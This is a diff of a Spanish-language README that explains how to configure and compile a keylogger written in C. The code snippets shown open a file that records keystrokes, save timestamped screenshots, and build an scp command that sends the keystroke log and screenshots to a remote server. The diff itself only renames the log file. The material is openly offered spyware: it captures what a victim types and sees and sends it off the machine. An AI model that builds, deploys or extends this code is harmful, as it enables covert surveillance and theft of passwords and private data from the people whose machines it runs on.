@@ -67,7 +67,7 @@ Dentro de keylogger.c configurar las rutas de acuerdo a donde se requieran:
   //se encuentra el ejecutable
 
   // Ruta del archivo que registra las teclas
-  log_file = fopen("keylog.txt", "a");
+  logger_file = fopen("keylogger.txt", "a");
   //Ruta de la carpeta que contiene las imagenes
   snprintf(filename, sizeof(filename), "screenshot_%04d-%02d-%02d_%02d-%02d-%02d.png",
 ```
@@ -76,7 +76,7 @@ Dentro de keylogger.c en la función **_transfer_files_** modificar la variable 
 
 ```c
   //Variable de ruta
-  snprintf(command, sizeof(command), "scp keylog.txt screenshot_*.png user@server:/path/to/destination/");
+  snprintf(command, sizeof(command), "scp keylogger.txt screenshot_*.png user@server:/path/to/destination/");
 ```
 
 Una vez teniendo el archivo **keylogger.c** configurado ejecutar el siguiente comando para compilarlo:
